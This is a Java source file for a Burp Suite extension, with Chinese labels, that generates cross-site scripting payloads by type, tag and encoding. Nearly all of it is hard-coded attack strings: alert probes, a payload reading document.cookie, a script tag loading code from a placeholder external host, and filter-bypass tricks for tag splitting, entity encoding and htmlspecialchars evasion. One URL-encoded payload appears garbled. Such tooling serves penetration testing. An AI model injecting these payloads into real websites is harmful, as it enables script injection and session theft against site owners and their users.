package com.bp.generators;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.logging.Logging;

import javax.swing.*;
import javax.swing.border.EmptyBorder;
import javax.swing.border.TitledBorder;
import java.awt.*;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

/**
 * XSS载荷生成器
 */
public class XSSPayloadGenerator implements Generator {
    private final MontoyaApi api;
    private final Logging logging;
    
    public XSSPayloadGenerator(MontoyaApi api) {
        this.api = api;
        this.logging = api.logging();
    }
    
    @Override
    public String getName() {
        return "XSS载荷生成器";
    }
    
    @Override
    public JPanel createOperationPanel(ResultCallback callback) {
        this.resultCallback = callback;
        JPanel panel = new JPanel(new BorderLayout());
        panel.setBorder(new EmptyBorder(10, 10, 10, 10));

        // 参数设置面板
        JPanel paramPanel = new JPanel(new GridBagLayout());
        paramPanel.setBorder(new TitledBorder("参数设置"));
        GridBagConstraints gbc = new GridBagConstraints();
        gbc.insets = new Insets(5, 5, 5, 5);
        gbc.anchor = GridBagConstraints.WEST;
        gbc.fill = GridBagConstraints.HORIZONTAL;

        // XSS类型下拉框
        gbc.gridx = 0;
        gbc.gridy = 0;
        paramPanel.add(new JLabel("XSS类型:"), gbc);

        String[] xssTypes = {
                "基础XSS",
                "获取Cookie",
                "外部攻击代码",
                "图像/框架/媒体",
                "事件触发",
                "过滤绕过",
                "htmlspecialchars绕过",
                "href输出",
                "js输出",
                "URL编码"
        };
        JComboBox<String> xssCombo = new JComboBox<>(xssTypes);
        gbc.gridx = 1;
        paramPanel.add(xssCombo, gbc);

        // 标签类型下拉框
        gbc.gridx = 2;
        paramPanel.add(new JLabel("标签类型:"), gbc);

        String[] tags = { "script", "img", "svg", "iframe", "body", "video", "style", "input" };
        JComboBox<String> tagCombo = new JComboBox<>(tags);
        gbc.gridx = 3;
        paramPanel.add(tagCombo, gbc);

        // 编码方式下拉框
        gbc.gridx = 4;
        paramPanel.add(new JLabel("编码方式:"), gbc);

        String[] encodings = { "无编码", "URL编码", "HTML实体编码", "Base64编码" };
        JComboBox<String> encodingCombo = new JComboBox<>(encodings);
        gbc.gridx = 5;
        paramPanel.add(encodingCombo, gbc);

        // 生成按钮
        JButton generateButton = new JButton("生成XSS载荷");
        gbc.gridx = 6;
        paramPanel.add(generateButton, gbc);

        // 添加到主面板
        panel.add(paramPanel, BorderLayout.CENTER);

        // 生成按钮事件
        generateButton.addActionListener(e -> {
            int selectedIndex = xssCombo.getSelectedIndex();
            String tag = (String) tagCombo.getSelectedItem();
            int encodingIndex = encodingCombo.getSelectedIndex();

            StringBuilder payload = new StringBuilder();

            switch (selectedIndex) {
                case 0: // 基础XSS
                    switch (tag) {
                        case "script":
                            payload.append("<script>alert(1)</script>");
                            break;
                        case "img":
                            payload.append("<img src=x onerror=alert(1)>");
                            break;
                        case "svg":
                            payload.append("<svg onload=alert(1)></svg>");
                            break;
                        case "iframe":
                            payload.append("<iframe src=\"javascript:alert(1)\"></iframe>");
                            break;
                        case "body":
                            payload.append("<body onload=alert(1)></body>");
                            break;
                        case "video":
                            payload.append("<video onloadstart=alert(1) src=\"/media/hack-the-planet.mp4\" />");
                            break;
                        case "style":
                            payload.append("<style onload=alert(1)></style>");
                            break;
                        case "input":
                            payload.append("<input onfocus=alert(1) autofocus>");
                            break;
                        default:
                            payload.append("<script>alert(1)</script>");
                    }
                    break;

                case 1: // 获取Cookie
                    payload.append("<script>alert(document.cookie)</script>");
                    break;

                case 2: // 外部攻击代码
                    payload.append("<script src='http://your.domain.com/xss.js'></script>");
                    break;

                case 3: // 图像/框架/媒体
                    if ("img".equals(tag)) {
                        payload.append("<img src=x onerror=alert(1)>");
                    } else if ("iframe".equals(tag)) {
                        payload.append("<iframe onload=alert('xss')></iframe>");
                    } else if ("svg".equals(tag)) {
                        payload.append("<svg onload=alert(1)></svg>");
                    } else if ("video".equals(tag)) {
                        payload.append("<video onloadstart=alert(1) src=\"/media/hack-the-planet.mp4\" />");
                    } else if ("body".equals(tag)) {
                        payload.append("<body onload=alert(1)></body>");
                    } else {
                        payload.append("<img src=x onerror=alert(1)>");
                    }
                    break;

                case 4: // 事件触发
                    if ("input".equals(tag)) {
                        payload.append("<input onmouseover=alert(1)>");
                    } else if ("img".equals(tag)) {
                        payload.append("<img src=x onmouseover=alert(1)>");
                    } else if ("body".equals(tag)) {
                        payload.append("<body onmouseover=alert(1)></body>");
                    } else {
                        payload.append("#' onclick=\"alert(111)\">");
                    }
                    break;

                case 5: // 过滤绕过
                    switch (tag) {
                        case "script":
                            payload.append("<scr<script>ipt>alert(1)</scr</script>ipt>");
                            break;
                        case "img":
                            payload.append("<img src=x onerror=alert(String.fromCharCode(88,83,83))>");
                            break;
                        case "svg":
                            payload.append("<svg onload=&quot;alert(1)&quot;>");
                            break;
                        case "iframe":
                            payload.append(
                                    "<iframe src=\"ja&#118&#97&#115&#99&#114&#105&#112&#116:alert(1)\"></iframe>");
                            break;
                        case "body":
                            payload.append("<body onload=alert(/XSS/.source)>");
                            break;
                        default:
                            payload.append("<scr<script>ipt>alert(1)</scr</script>ipt>");
                    }
                    break;

                case 6: // htmlspecialchars绕过
                    String[] payloads = {
                            "' onclick='alert(111)'",
                            "' onmouseover='alert(1)'",
                            "' onmouseover='javascript:alert(1)'"
                    };
                    payload.append(payloads[new java.util.Random().nextInt(payloads.length)]);
                    break;

                case 7: // href输出
                    payload.append("javascript:alert(1)");
                    break;

                case 8: // js输出
                    payload.append("lili'</script><script>alert(\"xss\")</script>");
                    break;

                case 9: // URL编码
                    payload.append("%22onmouseover%3D%2261leralertt(11)");
                    break;

                default:
                    payload.append("<script>alert(1)</script>");
            }

            // 应用编码
            String result = payload.toString();
            switch (encodingIndex) {
                case 1: // URL编码
                    try {
                        result = java.net.URLEncoder.encode(result, StandardCharsets.UTF_8.name());
                    } catch (Exception ex) {
                        logging.logToError("URL编码失败: " + ex.getMessage());
                    }
                    break;
                case 2: // HTML实体编码
                    result = result.replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'",
                            "&#39;");
                    break;
                case 3: // Base64编码
                    result = Base64.getEncoder().encodeToString(result.getBytes(StandardCharsets.UTF_8));
                    break;
            }

            // 这里需要回调到主面板设置结果
            if (resultCallback != null) {
                resultCallback.setResultText(result);
            }
        });

        return panel;
    }
    
    private ResultCallback resultCallback;
    
    public void setResultCallback(ResultCallback callback) {
        this.resultCallback = callback;
    }
}